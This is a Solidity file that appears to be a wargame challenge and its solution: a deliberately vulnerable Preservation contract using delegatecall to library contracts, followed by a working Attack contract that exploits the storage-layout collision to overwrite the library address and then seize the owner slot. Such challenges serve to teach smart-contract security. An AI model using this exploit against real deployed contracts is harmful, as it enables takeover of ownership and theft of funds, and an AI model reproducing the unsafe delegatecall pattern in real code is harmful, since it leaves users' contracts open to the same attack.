// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Challenge :- You need to become the owner of preservation contract.

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}



////////////////////////////////////////////////////////
/////////////////ATTACK/////////////////////////////////
////////////////////////////////////////////////////////
contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(Preservation target) external {
        //set the timezone1 contract address to our attac contract address using the vulnerability of storage layout.
        target.setFirstTime(uint256(uint160(address(this))));

        //now the delegatecall will call our attack contract instead of real timezone contract
        target.setFirstTime(uint256(uint160(msg.sender)));

        require(target.owner() ==msg.sender,"failed");
    }
//delegatecall will call setTime to set the time but it will imstead set the owner address as per our setTime function.
    function setTime(uint256 _owner) external {
        owner = address(uint160(_owner));
    }
}
